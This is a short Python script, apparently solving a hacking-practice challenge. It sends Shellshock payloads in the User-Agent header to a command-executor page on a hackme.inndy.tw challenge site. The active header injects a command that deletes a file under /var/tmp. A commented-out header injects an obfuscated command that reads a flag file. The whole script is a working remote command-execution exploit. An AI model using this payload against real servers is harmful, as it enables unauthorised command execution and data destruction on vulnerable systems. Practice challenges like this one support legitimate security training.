import requests

# headers = {'User-Agent': '() { : ;}; /fl$1ag-reader /f$1lag > /var/tmp/f < /var/tmp/f '}
headers = {'User-Agent': '() { : ;}; rm /var/tmp/f '}
r = requests.get('https://command-executor.hackme.inndy.tw/index.php?func=cmd&cmd=env', headers=headers)
print(r.text)
